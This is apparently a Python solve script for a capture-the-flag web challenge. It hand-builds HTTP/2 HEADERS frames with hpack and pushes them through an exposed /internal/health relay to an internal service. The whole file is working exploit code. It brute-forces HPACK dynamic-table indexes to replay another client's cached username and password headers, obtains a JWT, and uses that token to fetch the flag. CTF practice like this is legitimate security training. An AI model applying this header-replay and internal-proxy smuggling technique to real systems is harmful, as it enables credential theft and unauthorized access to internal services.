# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
import re
import sys

# third-party imports
import requests
from loguru import logger
import hpack
from hyperframe.frame import HeadersFrame, Frame


HOST = "192.168.200.130:12001"  # change here
s = requests.Session()


def construct_headerFrame(h: bytes, streamID: int) -> bytes:
    hf = HeadersFrame(streamID, h)
    hf.flags.add('END_HEADERS')
    return hf.serialize()


def get_FLAG(token: str) -> None:
    flag = None
    encoder2 = hpack.Encoder()  # 用同一个 Encoder 的话好像获取不到 flag
    header = encoder2.encode({
        ':path': '/flag',
        ':method': 'GET',
        ':authority': 'babyweb_internal',
        ':scheme': 'https',
        'x-token': token
    })
    data = b''.join([construct_headerFrame(header, 7)]).decode('latin-1')

    r = s.post(f"http://{HOST}/internal/health", json={
        "data": data,
        "type": "2"
    })
    resp = r.content.decode('latin-1')
    if 'flag' in resp:
        r = re.compile('"flag":"(.*?)"')
        flag = r.search(resp).group(1)
        logger.success(f"Get Flag: {flag}")
    else:
        logger.error("Failed to get Flag.")
        sys.exit(1)


def get_JWT() -> str:
    token = None
    encoder1 = hpack.Encoder()
    header = encoder1.encode({
        ':path': '/auth',
        ':method': 'GET',
        ':authority': 'babyweb_internal',  # equivalent with `host` header field in HTTP/1.x
        ':scheme': 'https',
    })

    # 遍历索引表, 因为静态表长度61, 所以从62开始
    for i in range(62, 128):
        indexed_header = encoder1._encode_indexed(i)       # x-user-uuid4()
        indexed_header += encoder1._encode_indexed(i + 1)  # x-pass-uuid4()
        headers = header + indexed_header
        # Stream ID 为奇数即可
        data = b''.join([construct_headerFrame(headers, 5)]).decode('latin-1')

        r = s.post(f"http://{HOST}/internal/health", json={
            "data": data,
            "type": "2"
        })

        # content = r.content
        # print(i)
        # print(content)
        # while content:
        #     frame, length = Frame.parse_frame_header(content[:9])
        #     print(frame, length)
        #     content = content[9 + length:]

        resp = r.content.decode('latin-1')
        if 'token' in resp:
            logger.success(f"Get JWT token successfully, index: {i}")

            r = re.compile('"token":"(.*?)"')
            token = r.search(resp).group(1)
            logger.success(f"JWT token: {token}")
            break

    if token is None:
        logger.error("Failed to get JWT token.")
        sys.exit(1)
    return token


def main():
    logger.info('Start to get JWT token...')
    jwt_token = get_JWT()

    logger.info('Start to get Flag...')
    get_FLAG(jwt_token)


if __name__ == '__main__':
    main()
